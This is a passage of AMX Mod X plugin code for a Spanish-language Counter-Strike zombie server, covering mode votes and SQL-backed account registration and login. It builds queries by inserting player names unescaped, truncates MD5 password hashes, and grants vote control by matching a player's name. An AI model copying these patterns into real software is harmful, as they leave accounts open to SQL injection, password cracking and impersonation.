		case MODE_WESKER: formatex(sz_ModeName, charsmax(sz_ModeName), "wesker")
		case MODE_NINJA: formatex(sz_ModeName, charsmax(sz_ModeName), "jason")
		case MODE_SNIPER: formatex(sz_ModeName, charsmax(sz_ModeName), "sniper")
		case MODE_TARINGA: formatex(sz_ModeName, charsmax(sz_ModeName), "Taringa!")
		case MODE_NEMESIS: formatex(sz_ModeName, charsmax(sz_ModeName), "nemesis")
		case MODE_TROLL: formatex(sz_ModeName, charsmax(sz_ModeName), "troll")
		case MODE_INFECTION: formatex(sz_ModeName, charsmax(sz_ModeName), "primer zombie")
	}
	switch(g_iStartMode[1])
	{
		case MODE_SURVIVOR: formatex(sz_ModeName_, charsmax(sz_ModeName_), "survivor")
		case MODE_SWARM: formatex(sz_ModeName_, charsmax(sz_ModeName_), "swarm")
		case MODE_MULTI: formatex(sz_ModeName_, charsmax(sz_ModeName_), "infección multiple")
		case MODE_PLAGUE: formatex(sz_ModeName_, charsmax(sz_ModeName_), "plague")
		case MODE_ARMAGEDDON: formatex(sz_ModeName_, charsmax(sz_ModeName_), "armageddon")
		case MODE_SYNAPSIS: formatex(sz_ModeName_, charsmax(sz_ModeName_), "synapsis")
		case MODE_L4D: formatex(sz_ModeName_, charsmax(sz_ModeName_), "L4D")
		case MODE_WESKER: formatex(sz_ModeName_, charsmax(sz_ModeName_), "wesker")
		case MODE_NINJA: formatex(sz_ModeName_, charsmax(sz_ModeName_), "jason")
		case MODE_SNIPER: formatex(sz_ModeName_, charsmax(sz_ModeName_), "sniper")
		case MODE_TARINGA: formatex(sz_ModeName_, charsmax(sz_ModeName_), "Taringa!")
		case MODE_NEMESIS: formatex(sz_ModeName_, charsmax(sz_ModeName_), "nemesis")
		case MODE_TROLL: formatex(sz_ModeName_, charsmax(sz_ModeName_), "troll")
		case MODE_INFECTION: formatex(sz_ModeName_, charsmax(sz_ModeName_), "primer zombie")
	}
	
	CC(id, "!g[ZP]!y El modo actual es !g%s!y, en la próxima ronda se jugará el modo !g%s!y", sz_ModeName, sz_ModeName_)
	
	return PLUGIN_HANDLED;
}*/

new g_VoteModes[9];
new g_VotesModes_2[9];
new g_VotesModes_3[2];
new g_Votantes;
new const sz_MODE_NAMES[][] = { "Inf. Multiple", "Sniper", "Jason", "Troll", "Wesker", "Nemesis", "L4D", "Armageddon", "Plague" }
public clcmd_votemodes(id)
{
	if( equal( g_playername[id], "Kiske-SO     T! CS" ) )
	{
		new a;
		for(a = 1; a <= g_maxplayers; a++)
		{
			if( !g_isconnected[a] || !gLogeado[a] )
				continue;
				
			show_menu_modes(a, 0)
		}
		
		g_VoteModes = { 0, 0, 0, 0, 0, 0, 0, 0, 0 };
		g_VotesModes_2 = { 0, 0, 0, 0, 0, 0, 0, 0, 0 };
		g_VotesModes_3 = { 0, 0 };
		g_Votantes = 0;
		
		CC(0, "!g[ZP]!y Se ha iniciado una votación de modos.")
		
		set_task(16.0, "EndVoteModes", id)
	}
	
	return PLUGIN_HANDLED;
}
public show_menu_modes(id, mode)
{
	static menu[512], len;
	len = 0
	
	// Title
	len += formatex(menu[len], charsmax(menu) - len, "\y¿ QUE MODO DESEAS JUGAR ?^n^n")
	
	if(!mode)
	{
		new a;
		for(a = 0; a < sizeof(sz_MODE_NAMES); a++)
			len += formatex(menu[len], charsmax(menu) - len, "\r%d. \w%s^n", a+1, sz_MODE_NAMES[a])
	}
	else
	{
		len += formatex(menu[len], charsmax(menu) - len, "\r1. \w^n", sz_MODE_NAMES[g_VotesModes_3[0]])
		len += formatex(menu[len], charsmax(menu) - len, "\r2. \w", sz_MODE_NAMES[g_VotesModes_3[1]])
	}
	
	// 0. Exit
	len += formatex(menu[len], charsmax(menu) - len, "^n\r0.\w Salir")
	
	show_menu(id, KEYSMENU, menu, 15, "Menu Modes")
}
public menu_modes(id, key)
{
	if(!g_isconnected[id] || !gLogeado[id])
		return PLUGIN_HANDLED;
	
	switch(key)
	{
		case 0..8: 
		{
			g_VoteModes[key]++;
			g_VotesModes_2[key]++;
			
			g_Votantes++;
		}
	}
	
	return PLUGIN_HANDLED;
}
public EndVoteModes(id)
{
	SortIntegers(g_VoteModes, sizeof(g_VoteModes) - 1, Sort_Descending)
	
	new a, b, Float:i_Porc = 0.00;
	i_Porc = float(g_VoteModes[0]) / float(g_Votantes) // Opcion mas votada / votantes = Porcentaje
	
	if(i_Porc > 50.00) // Lo eligio el mas de 50%.
	{
		for(a = 0; a < 9; a++)
		{
			if(g_VoteModes[0] == g_VotesModes_2[a])
			{
				b = a;
				break;
			}
		}
	
		CC(0, "!g[ZP]!y Votación finalizada. El ganador es el modo !g%s!y con !g%d votos!y", sz_MODE_NAMES[b], g_VoteModes[0])
		
		g_iStartMode[1] = (b == 0) ? MODE_MULTI : (b == 1) ? MODE_SNIPER : (b == 2) ? MODE_NINJA : (b == 3) ? MODE_TROLL : (b == 4) ? MODE_WESKER : (b == 5) ?
		MODE_NEMESIS : (b == 6) ? MODE_L4D : (b == 7) ? MODE_ARMAGEDDON : (b == 8) ? MODE_PLAGUE : g_iStartMode[1]
	}
	else
	{
		CC(0, "!g[ZP]!y Votación finalizada. Ningún modo supero el 50%% de los votos, votación por los 2 más votados.")
		
		new a;
		for(a = 0; a < 9; a++)
		{
			if(g_VoteModes[0] == g_VotesModes_2[a])
			{
				g_VotesModes_3[0] = a;
				break;
			}
		}
		
		for(a = 0; a < 9; a++)
		{
			if(g_VoteModes[1] == g_VotesModes_2[a])
			{
				g_VotesModes_3[1] = a;
				break;
			}
		}
		
		g_VoteModes = { 0, 0, 0, 0, 0, 0, 0, 0, 0 };
		g_VotesModes_2 = { 0, 0, 0, 0, 0, 0, 0, 0, 0 };
		g_Votantes = 0;
		
		CC(0, "!g[ZP]!y Se ha iniciado una votación con los 2 modos más votados")
		
		for(a = 1; a <= g_maxplayers; a++)
		{
			if( !g_isconnected[a] || !gLogeado[a] )
				continue;
				
			show_menu_modes(id, 1)
		}
		
		set_task(12.0, "EndVoteModes", id)
	}
}
public clcmd_invis(id)
{
	if(is_user_connected(id))
	{
		gViewInvisible[id] = !gViewInvisible[id]
		CC(id, "!g[ZP]!y Ahora tus compañeros HUMANOS son %s. Tus disparos/bombas NO los atraviesan", gViewInvisible[id] ? "invisibles" : "visibles")
		//else CC(id, "!g[ZP]!y El comando escrito ha sido desactivado por algunos problemas técnicos")
	}
}

// Nightvision toggle
public clcmd_nightvision(id)
{
	if (g_nvision[id])
	{
		// Enable-disable
		g_nvisionenabled[id] = !(g_nvisionenabled[id])
		
		// Custom nvg?
		remove_task(id+TASK_NVISION)
		if (g_nvisionenabled[id]) set_task(0.1, "set_user_nvision", id+TASK_NVISION, _, _, "b")
	}
	
	return PLUGIN_HANDLED;
}

// Weapon Drop
public clcmd_drop(id)
{
	return PLUGIN_HANDLED;
	// Survivor should stick with its weapon
	/*if (g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] || gSniper[id])
		return PLUGIN_HANDLED;
	
	return PLUGIN_CONTINUE;*/
}

// Buy Ammo
public clcmd_buyammo(id) return PLUGIN_HANDLED;

// Block Radio
public clcmd_blockradio(id)	return PLUGIN_HANDLED;

// Unstuck
public clcmd_unstuck(id)
{
	// Check if player is stuck
	if (g_isalive[id])
	{
		if (is_player_stuck(id, g_zombie[id] ? 1 : 0))
		{
			// Move to an initial spawn
			do_random_spawn(id) // random spawn (including CSDM)
			CC(id, "!g[ZP]!y Has sido teletransportado debido a que estabas trabado")
		}
	}
}

// Block Team Change
public clcmd_changeteam(id)
{
	if( !gLogeado[id] && !is_user_bot(id) && !is_user_hltv(id) )
	{
		show_menu_reglog(id)
		return PLUGIN_HANDLED;
	}
	
	static team
	team = fm_cs_get_user_team(id)
	
	// Unless it's a spectator joining the game
	if (team == FM_CS_TEAM_SPECTATOR || team == FM_CS_TEAM_UNASSIGNED)
		return PLUGIN_CONTINUE;
	
	// Pressing 'M' (chooseteam) ingame should show the main menu instead
	show_menu_game(id)
	return PLUGIN_HANDLED;
}

public show_menu_reglog(id)
{
	if( gLogeado[id] || is_user_bot(id) || is_user_hltv(id) )
		return PLUGIN_HANDLED;
	
	static menu[750], len
	len = 0
	
	len += formatex(menu[len], charsmax(menu) - len, "\yBienvenidos a %s^n^n", g_modname)
	
	len += formatex( menu[len], charsmax(menu) - len, "\r1.\w Registrarme^n" )
	len += formatex( menu[len], charsmax(menu) - len, "\r2.\w Identificarme^n^n\rNOTA:\w Si tenes alguna duda sobre esto,^ningresa al foro, sección ZP e informate" )
	
	//len += formatex( menu[len], charsmax(menu) - len, "\r3.\w ¿Cómo registrarme/identificarme?^n" )
	
	show_menu(id, KEYSMENU, menu, -1, "RegLog Menu")
	
	return PLUGIN_HANDLED;
}

public menu_reglog(id, key)
{
	if( gLogeado[id] || is_user_bot(id) || is_user_hltv(id) )
		return PLUGIN_HANDLED;
	
	switch (key)
	{
		case 0: // REGISTRARME
		{
			if(gRegistrado[id])
			{
				CC(id, "!g[ZP]!y Tu nombre (!g%s!y) ya está registrado en nuestra base de datos", g_playername[id])
				clcmd_changeteam(id)
			}
			else client_cmd(id, "messagemode R_PASSWORD")
		}
		case 1: // IDENTIFICARME
		{
			if(gRegistrado[id])
			{
				// ESTA REGISTRADO
				client_cmd(id, "messagemode L_PASSWORD")
			}
			else 
			{
				CC(id, "!g[ZP]!y Tu nombre (!g%s!y) no está registrado en nuestra base de datos", g_playername[id])
				clcmd_changeteam(id)
			}
		}
		/*case 2: // COMO REGISTRARME / IDENTIFICARME
		{
			clcmd_changeteam(id)
			show_motd(id, "http://www.taringacs.net/servidores/27025/ayuda.php", "Indicaciones")
		}*/
	}
	
	return PLUGIN_HANDLED;
}

public clcmd_L_Password(id)
{
	if( gLogeado[id] || is_user_bot(id) || is_user_hltv(id) ) return PLUGIN_HANDLED;
	
	new sz_clcmd_l_password[191];
	
	read_args( sz_clcmd_l_password, 190 )
	remove_quotes( sz_clcmd_l_password )
	trim( sz_clcmd_l_password )
	
	if( containi( sz_clcmd_l_password, "'" ) != -1 || containi( sz_clcmd_l_password, "/" ) != -1 || equali( sz_clcmd_l_password, "" ) ||
	containi( sz_clcmd_l_password, " " ) != -1 || containi( sz_clcmd_l_password, "\" ) != -1 )
	{
		CC( id, "!g[ZP]!y Los símbolos ' / \ y los espacios no están permitidos en la contraseña" )
		
		clcmd_changeteam(id)
		return PLUGIN_HANDLED;
	}
	
	new Handle:SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT * FROM accounts WHERE name = ^"%s^";", g_playername[id] )
	
	if( !SQL_Execute( SQL_CONSULTA ) )
	{
		server_cmd( "kick #%d ^"ERROR_1: CONSULTA RECHAZADA^"", get_user_userid(id) )
		
		SQL_FreeHandle( SQL_CONSULTA )
		
		return PLUGIN_HANDLED;
	}
	else if( SQL_NumResults( SQL_CONSULTA ) )
	{
		new sz_md5_pass[34], sz_SQL_Pass[32];
		
		md5(sz_clcmd_l_password, sz_md5_pass)
		sz_md5_pass[10] = EOS
		
		SQL_ReadResult( SQL_CONSULTA, 2, sz_SQL_Pass, 31 )
		
		if( equal( sz_md5_pass, sz_SQL_Pass ) )
		{
			zp_id[id] = SQL_ReadResult( SQL_CONSULTA, 0 )
		
			new sz_UIp[32], SQL_1_x[32]; 
			
			get_user_ip(id, sz_UIp, 31, 1)
			SQL_ReadResult( SQL_CONSULTA, 3, SQL_1_x, 31 )
			
			if( !equali( SQL_1_x, sz_UIp ) )
			{
				SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `ip` = '%s' WHERE `id` = '%d';", sz_UIp, zp_id[id] )
			}
			
			gLogeado[id] = 1
			
			/// |=========|
			/// |  DATES  |
			/// |=========|
			g_ammopacks[id] = SQL_ReadResult( SQL_CONSULTA, 5 )
			gLevel[id] = SQL_ReadResult( SQL_CONSULTA, 6 )
			gReset[id] = SQL_ReadResult( SQL_CONSULTA, 7 )
			
			switch(gReset[id])
			{
				case 0: gAP_Percent[id] = DEF_AP_PERCENT
				case 1: gAP_Percent[id] = ( ( float(g_ammopacks[id]) - float(gAMMOPACKS_NEEDED_RESET(gLevel[id]-1)) ) * 100.0 ) / ( float(gAMMOPACKS_NEEDED_RESET(gLevel[id])) - float(gAMMOPACKS_NEEDED_RESET(gLevel[id]-1)) )
				case 2..3: gAP_Percent[id] = gAP_Percent[id] = ( ( float(g_ammopacks[id]) - float(gAMMOPACKS_NEEDED_RESET_2(gLevel[id]-1)) ) * 100.0 ) / ( float(gAMMOPACKS_NEEDED_RESET_2(gLevel[id])) - float(gAMMOPACKS_NEEDED_RESET_2(gLevel[id]-1)) )
				case 4..9999: gAP_Percent[id] = ( ( float(g_ammopacks[id]) - float(gAMMOPACKS_NEEDED_RESET_4(gLevel[id]-1)) ) * 100.0 ) / ( float(gAMMOPACKS_NEEDED_RESET_4(gLevel[id])) - float(gAMMOPACKS_NEEDED_RESET_4(gLevel[id]-1)) )
			}
			
			// Parse points
			new szPoints[64], szPointsHZSNE[MAX_HAB][12];
			new a = 0;
			
			SQL_ReadResult( SQL_CONSULTA, 8, szPoints, 63 )
			parse( szPoints, szPointsHZSNE[HAB_HUMAN], 11, szPointsHZSNE[HAB_ZOMBIE], 11, szPointsHZSNE[HAB_SURVIVOR], 11, szPointsHZSNE[HAB_NEMESIS], 11, szPointsHZSNE[HAB_SPECIAL], 11 )
			
			for(a = 0; a < MAX_HAB; a++) 
				gPoints[id][a] = str_to_num( szPointsHZSNE[a] )
			
			// Parse habilities - Humans
			new szHabilities[32], szHabH[MAX_SPECIAL_HABILITIES][6];
			
			SQL_ReadResult( SQL_CONSULTA, 9, szHabilities, 31 )
			parse( szHabilities, szHabH[0], 5, szHabH[1], 5, szHabH[2], 5, szHabH[3], 5, szHabH[4], 5 )
			
			for(a = 0; a < MAX_SPECIAL_HABILITIES; a++)
				g_hab[id][HAB_HUMAN][a] = str_to_num( szHabH[a] )
			
			// Habilities - Zombies
			SQL_ReadResult( SQL_CONSULTA, 10, szHabilities, 31 )
			parse( szHabilities, szHabH[0], 5, szHabH[1], 5, szHabH[2], 5, szHabH[3], 5, szHabH[4], 5 )
			
			for(a = 0; a < MAX_SPECIAL_HABILITIES; a++)
				g_hab[id][HAB_ZOMBIE][a] = str_to_num( szHabH[a] )
			
			// Habilities - Survivors
			SQL_ReadResult( SQL_CONSULTA, 11, szHabilities, 31 )
			parse( szHabilities, szHabH[0], 5, szHabH[1], 5, szHabH[2], 5, szHabH[3], 5, szHabH[4], 5 )
			
			for(a = 0; a < MAX_SPECIAL_HABILITIES; a++)
				g_hab[id][HAB_SURVIVOR][a] = str_to_num( szHabH[a] )
			
			// Habilities - Nemesis
			SQL_ReadResult( SQL_CONSULTA, 12, szHabilities, 31 )
			parse( szHabilities, szHabH[0], 5, szHabH[1], 5, szHabH[2], 5, szHabH[3], 5, szHabH[4], 5 )
			
			for(a = 0; a < MAX_SPECIAL_HABILITIES; a++)
				g_hab[id][HAB_NEMESIS][a] = str_to_num( szHabH[a] )
			
			// Habilities - Specials
			SQL_ReadResult( SQL_CONSULTA, 13, szHabilities, 31 )
			parse( szHabilities, szHabH[4], 5, szHabH[6], 5, szHabH[7], 5, szHabH[5], 5 )
			
			g_hab[id][HAB_SPECIAL][5] = str_to_num( szHabH[5] )
			g_hab[id][HAB_SPECIAL][6] = str_to_num( szHabH[6] )
			g_hab[id][HAB_SPECIAL][7] = str_to_num( szHabH[7] )
			
			// Zombie & Human Class
			g_zombieclassnext[id] = 0
			g_zombieclass[id] = 0
			g_humanclassnext[id] = 0
			g_humanclass[id] = 0
			
			// Parse record weapons
			new szWeapons[32], szWeaponAutoOn[8], szWeaponPrimary[8], szWeaponSecondary[8], szWeaponTerciary[8];
			
			SQL_ReadResult( SQL_CONSULTA, 16, szWeapons, 31 )
			parse( szWeapons, szWeaponAutoOn, 7, szWeaponPrimary, 7, szWeaponSecondary, 7, szWeaponTerciary, 7 )
			
			g_menu_data[id][2] = str_to_num( szWeaponAutoOn )
			g_menu_data[id][3] = str_to_num( szWeaponPrimary )
			g_menu_data[id][4] = str_to_num( szWeaponSecondary )
			g_menu_data[id][6] = str_to_num( szWeaponTerciary )
			
			// Parse record grenades
			new szGrenades[32], szGrenadeInfection[8], szGrenadeNapalm[8], szGrenadeFrost[8], szGrenadeSuperNova[8];
			
			SQL_ReadResult( SQL_CONSULTA, 17, szGrenades, 31 )
			parse( szGrenades, szGrenadeInfection, 7, szGrenadeNapalm, 7, szGrenadeFrost, 7, szGrenadeSuperNova, 7 )
			
			gImpact[id][GRENADE_INFECTION] = str_to_num( szGrenadeInfection )
			gImpact[id][GRENADE_NAPALM] = str_to_num( szGrenadeNapalm )
			gImpact[id][GRENADE_FROST] = str_to_num( szGrenadeFrost )
			gImpact[id][GRENADE_SUPERNOVA] = str_to_num( szGrenadeSuperNova )
			
			
			/// |=============|
			/// |  DATES SEC  |
			/// |=============|
			SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `last_connect` = now() WHERE `id` = '%d';", zp_id[id] )
			
			gDmgEcho[id] = SQL_ReadResult( SQL_CONSULTA, 20 )
			gDmgRec[id] = SQL_ReadResult( SQL_CONSULTA, 21 )
			
			gKills[id] = SQL_ReadResult( SQL_CONSULTA, 22 )
			gKillsRec[id] = SQL_ReadResult( SQL_CONSULTA, 23 )
			
			gInfects[id] = SQL_ReadResult( SQL_CONSULTA, 24 )
			gInfectsRec[id] = SQL_ReadResult( SQL_CONSULTA, 25 )
			
			// Parse colors
			new szNVG_HUD[32], szNVG_RGB[3][4], szHUD_RGB[3][4];
			
			SQL_ReadResult( SQL_CONSULTA, 26, szNVG_HUD, 31 )
			parse( szNVG_HUD, szNVG_RGB[0], 3, szNVG_RGB[1], 3, szNVG_RGB[2], 3, szHUD_RGB[0], 3, szHUD_RGB[1], 3, szHUD_RGB[2], 3 )
			
			for(a = 0; a < 3; a++)
			{
				g_color_nvg[id][a] = str_to_num( szNVG_RGB[a] )
				g_color_hud[id][a] = str_to_num( szHUD_RGB[a] )
			}
			
			// Parse hud position
			new szHUD_XYC[32], szHUD_X[6], szHUD_Y[6], szHUD_C[6];
			
			SQL_ReadResult( SQL_CONSULTA, 27, szHUD_XYC, 31 )
			parse( szHUD_XYC, szHUD_X, 5, szHUD_Y, 5, szHUD_C, 5 )
			
			g_hud_xyc[id][0] = str_to_float( szHUD_X )
			g_hud_xyc[id][1] = str_to_float( szHUD_Y )
			g_hud_xyc[id][2] = str_to_float( szHUD_C )
			
			gMaxCombo[id] = SQL_ReadResult( SQL_CONSULTA, 28 )
			
			
			/// |=============|
			/// |  DATES TER  |
			/// |=============|
			gApost[id][0] = SQL_ReadResult( SQL_CONSULTA, 29 )
			gApost[id][1] = SQL_ReadResult( SQL_CONSULTA, 30 )
			
			if(gApost[id][0] > 450)
			{
				gApostG[id][0] = gApost[id][0]
				gApostG[id][1] = gApost[id][1]
				
				gYaAposto[id] = 1;
			}
			
			
			/// |=============|
			/// |  DATES CUA  |
			/// |=============|
			gBombaMax[id] = SQL_ReadResult( SQL_CONSULTA, 31 )
			gFuriaMax[id] = SQL_ReadResult( SQL_CONSULTA, 32 )
			
			gViewInvisible[id] = SQL_ReadResult( SQL_CONSULTA, 33 )
			
			/// |==========|
			/// |  LOGROS  |
			/// |==========|
			// Parse logros
			new szLogros[128], szParseLogros[128];
			
			SQL_ReadResult( SQL_CONSULTA, 34, szLogros, 127 )
			parse( szLogros, szParseLogros, 127 )
			
			if(szParseLogros[0] == 'h' && szParseLogros[1] == '1') g_logro[id][LOGRO_HUMAN][KILL_15_1_ROUND] = 1;
			if(szParseLogros[2] == 'h' && szParseLogros[3] == '2') g_logro[id][LOGRO_HUMAN][KILL_25_1_ROUND] = 1;
			
			if(szParseLogros[4] == 'h' && szParseLogros[5] == '3') g_logro[id][LOGRO_HUMAN][A_DONDE_VAS] = 1;
			
			if(szParseLogros[6] == 'h' && szParseLogros[7] == '4') g_logro[id][LOGRO_HUMAN][A_CUCHILLO] = 1;
			if(szParseLogros[8] == 'h' && szParseLogros[9] == '5') g_logro[id][LOGRO_HUMAN][AFILANDO_CUCHILLOS] = 1;
			
			if(szParseLogros[12] == 'h' && szParseLogros[13] == '7') g_logro[id][LOGRO_HUMAN][CONTADOR_DE_DANIOS] = 1;
			if(szParseLogros[14] == 'h' && szParseLogros[15] == '8') g_logro[id][LOGRO_HUMAN][MORIRE_EN_EL_INTENTO] = 1;
			
			if(szParseLogros[16] == 'z' && szParseLogros[17] == '1') g_logro[id][LOGRO_ZOMBIE][LA_BOMBA_VERDE] = 1;
			if(szParseLogros[18] == 'z' && szParseLogros[19] == '2') g_logro[id][LOGRO_ZOMBIE][NO_ME_VEZ] = 1;
			if(szParseLogros[20] == 'z' && szParseLogros[21] == '3') g_logro[id][LOGRO_ZOMBIE][SOY_EL_ZOMBIE] = 1;
			if(szParseLogros[22] == 'z' && szParseLogros[23] == '4') g_logro[id][LOGRO_ZOMBIE][ASI_NO_VA] = 1;
			
			// Logros - Humans
			new i_Count[2] = { 0, 0 };
			
			for(new x = 0; x < MAX_SPECIAL_HABILITIES; x++)
			{
				if(g_hab[id][HAB_HUMAN][x] >= MAX_HAB_LEVEL[0][x])
					i_Count[0]++;
				
				if(g_hab[id][HAB_ZOMBIE][x] >= MAX_HAB_LEVEL[1][x])
					i_Count[1]++;
			}
			if(i_Count[0] >= MAX_SPECIAL_HABILITIES) g_logro[id][LOGRO_HUMAN][FULL_HAB_H] = 1;
			if(i_Count[1] >= MAX_SPECIAL_HABILITIES) g_logro[id][LOGRO_ZOMBIE][FULL_HAB_Z] = 1;
			
			if(gMaxCombo[id] >= 2500)
			{
				g_logro[id][LOGRO_HUMAN][COMBO_2500] = 1;
				
				if(gMaxCombo[id] >= 5000)
				{
					g_logro[id][LOGRO_HUMAN][COMBO_5000] = 1;
					
					if(gMaxCombo[id] >= 10000)
						g_logro[id][LOGRO_HUMAN][COMBO_10000] = 1;
				}
			}
			
			if(gKills[id] >= 20000)
			{
				g_logro[id][LOGRO_HUMAN][KILL_20000] = 1;
				
				if(gKills[id] >= 50000) 
				{
					g_logro[id][LOGRO_HUMAN][KILL_50000] = 1;
					
					if(gKills[id] >= 100000) 
						g_logro[id][LOGRO_HUMAN][KILL_100000] = 1;
				}
			}
			
			if(gReset[id] > 0) g_logro[id][LOGRO_HUMAN][RESET] = 1;
			
			// Logros - Zombies
			if(i_Count[1] >= MAX_SPECIAL_HABILITIES) g_logro[id][LOGRO_ZOMBIE][FULL_HAB_Z] = 1;
			
			if(gInfects[id] >= 10000)
			{
				g_logro[id][LOGRO_ZOMBIE][INFECT_10000] = 1;
				
				if(gInfects[id] >= 30000) 
				{
					g_logro[id][LOGRO_ZOMBIE][INFECT_30000] = 1;
					
					if(gInfects[id] >= 100000) 
						g_logro[id][LOGRO_ZOMBIE][INFECT_100000] = 1;
				}
			}
			
			client_cmd( id, "setinfo bottomcolor ^"^"" )
			client_cmd( id, "setinfo cl_lc ^"^"" )
			client_cmd( id, "setinfo model ^"^"" )
			client_cmd( id, "setinfo topcolor ^"^"" )
			client_cmd( id, "setinfo _9387 ^"^"" )
			client_cmd( id, "setinfo _iv ^"^"" )
			client_cmd( id, "setinfo _ah ^"^"" )
			client_cmd( id, "setinfo _puqz ^"^"" )
			client_cmd( id, "setinfo _ndmh ^"^"" )
			client_cmd( id, "setinfo _ndmf ^"^"" )
			client_cmd( id, "setinfo _ndms ^"^"" )
			
			client_cmd( id, "setinfo zpt ^"%s^"", sz_md5_pass )
			
			client_cmd(id, "chooseteam")
			//set_task(0.1, "clcmd_changeteam", id)
		}
		else
		{
			clcmd_changeteam(id)
			CC( id, "!g[ZP]!y La contraseña ingresada no coincide con la registrada en su cuenta. Es sensible a minúsculas y mayúsculas" )
		}
	}
	
	SQL_FreeHandle( SQL_CONSULTA )
	
	return PLUGIN_HANDLED;
}

new sz_clcmd_password[33][191], C_C[33][191];
public clcmd_Password(id)
{
	if( gLogeado[id] || gRegistrado[id] || is_user_bot(id) || is_user_hltv(id) ) return PLUGIN_HANDLED;
	
	read_args( sz_clcmd_password[id], 190 )
	remove_quotes( sz_clcmd_password[id] )
	trim( sz_clcmd_password[id] )
	
	if( containi( sz_clcmd_password[id], "'" ) != -1 || containi( sz_clcmd_password[id], "/" ) != -1 || equali( sz_clcmd_password[id], "" ) ||
	containi( sz_clcmd_password[id], " " ) != -1 || containi( sz_clcmd_password[id], "\" ) != -1 )
	{
		CC( id, "!g[ZP]!y Los símbolos ' / \ y los espacios no están permitidos en la contraseña" )
		
		clcmd_changeteam(id)
		return PLUGIN_HANDLED;
	}
	
	copy( C_C[id], charsmax( C_C[] ), sz_clcmd_password[id] )
	
	client_print(id, print_center, "Vuelva a escribir su contraseña por favor" )
	client_cmd( id, "messagemode REPEAT_PASSWORD" )
	
	/*new Rd = random_num( 0, 10 );
	switch(Rd)
	{
		case 3: formatex( C_C[id], 4, "%c%c%d%c", random_num('A', 'Z'), random_num('A', 'Z'), random_num(0, 9), random_num('A', 'Z') )
		case 5: formatex( C_C[id], 4, "%d%c%c%d", random_num(0, 9), random_num('A', 'Z'), random_num('A', 'Z'), random_num(0, 9) )
		case 8: formatex( C_C[id], 4, "%c%c%c%c", random_num('A', 'Z'), random_num('A', 'Z'), random_num('A', 'Z'), random_num('A', 'Z') )
		default: formatex( C_C[id], 4, "%d%d%c%c", random_num(0, 9), random_num(0, 9), random_num('A', 'Z'), random_num('A', 'Z') )
	}
	
	CC( id, "!g[ZP]!y Captcha: !g%s!y", C_C[id] )
	client_print(id, print_center, "Captcha: %s", C_C[id] )
	client_cmd( id, "messagemode CAPTCHA" )*/
	
	return PLUGIN_HANDLED;
}
public clcmd_RepeatPassword(id)
{
	if( gLogeado[id] || gRegistrado[id] || is_user_bot(id) || is_user_hltv(id) )
	{
		return PLUGIN_HANDLED;
	}
	
	new sz_clcmd_captcha[191];
	
	read_args( sz_clcmd_captcha, 190 )
	remove_quotes( sz_clcmd_captcha )
	trim( sz_clcmd_captcha )
	
	if( containi( sz_clcmd_captcha, "'" ) != -1 || containi( sz_clcmd_captcha, "/" ) != -1 || equali( sz_clcmd_captcha, "" ) ||
	containi( sz_clcmd_captcha, " " ) != -1 || containi( sz_clcmd_captcha, "\" ) != -1 )
	{
		CC( id, "!g[ZP]!y Los símbolos ' / \ y los espacios no están permitidos en la contraseña" )
		
		clcmd_changeteam(id)
		return PLUGIN_HANDLED;
	}
	
	new szCount[15], iCount;
	if( equal( sz_clcmd_captcha, C_C[id] ) )
	{
		if(gRegistrado[id])
		{
			CC(id, "!g[ZP]!y Tu nombre (!g%s!y) ya está registrado en nuestra base de datos", g_playername[id])
			clcmd_changeteam(id)
			
			return PLUGIN_HANDLED;
		}
	
		new szIp[32];
		get_user_ip(id, szIp, 31, 1)
		
		SQL_QueryAndIgnore( SQL_CONNECTION, "INSERT INTO `accounts` ( `name`, `password`, `ip`, `register`, `last_connect`)\
		VALUES ( ^"%s^", MD5('%s'), '%s', now(), now() )", g_playername[id], sz_clcmd_password[id], szIp )
		
		new Handle:SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT `id` FROM `accounts` WHERE `name` = ^"%s^";", g_playername[id] )
		if( !SQL_Execute( SQL_CONSULTA ) )
		{
			server_cmd( "kick #%d ^"ERROR_1: CONSULTA RECHAZADA^"", get_user_userid(id) )
			
			SQL_FreeHandle( SQL_CONSULTA )
			
			return PLUGIN_HANDLED;
		}
		else if( SQL_NumResults( SQL_CONSULTA ) )
		{
			iCount = SQL_ReadResult( SQL_CONSULTA, 0 )
			
			zp_id[id] = iCount
			
			AddDot( iCount, szCount, 14 )
			CC( 0, "!g[ZP]!y Bienvenido !g%s!y, eres la cuenta registrada número %s", g_playername[id], szCount )
			
			gLogeado[id] = 1
			gRegistrado[id] = 1
			
			client_cmd( id, "setinfo bottomcolor ^"^"" )
			client_cmd( id, "setinfo cl_lc ^"^"" )
			client_cmd( id, "setinfo model ^"^"" )
			client_cmd( id, "setinfo topcolor ^"^"" )
			client_cmd( id, "setinfo _9387 ^"^"" )
			client_cmd( id, "setinfo _iv ^"^"" )
			client_cmd( id, "setinfo _ah ^"^"" )
			client_cmd( id, "setinfo _puqz ^"^"" )
			client_cmd( id, "setinfo _ndmh ^"^"" )
			client_cmd( id, "setinfo _ndmf ^"^"" )
			client_cmd( id, "setinfo _ndms ^"^"" )
			
			new sz_md5_pass[34];
			md5(sz_clcmd_password[id], sz_md5_pass)
			sz_md5_pass[10] = EOS
			
			client_cmd( id, "setinfo zpt ^"%s^"", sz_md5_pass )
			
			client_cmd(id, "chooseteam")
		}
		
		SQL_FreeHandle( SQL_CONSULTA )
	}
	else
	{
		CC( id, "!g[ZP]!y La contraseña no coincide con la anterior. Es sensible a mayúsculas y minúsculas" )
		clcmd_changeteam(id)
	}
	
	return PLUGIN_HANDLED;
}

// Check Taringa Hour
public clcmd_th(id)
{
	CC(id, "!g[ZP]!y Tu multiplicador de !gammopacks es de x%d!y, y tu multiplicador de !gpuntos es de x%d!y", gTH_Mult[id][0], gTH_Mult[id][1] )
	return PLUGIN_HANDLED;
}
public clcmd_thhour(id)
{
	if( !gTH )
	{
		new iDateYMD[3], iUnix24, iUnixDif;
		date(iDateYMD[0], iDateYMD[1], iDateYMD[2])
		
		iUnix24 = TimeToUnix( iDateYMD[0], iDateYMD[1], iDateYMD[2], 23, 59, 59 )
		iUnixDif = iUnix24 - ( get_systime( ) + ( -3 * gHOUR_SECONDS ) )
		
		new iYear, iMonth, iDay, iHour, iMinute, iSecond, szHour[32], szMinute[32], szSecond[32];
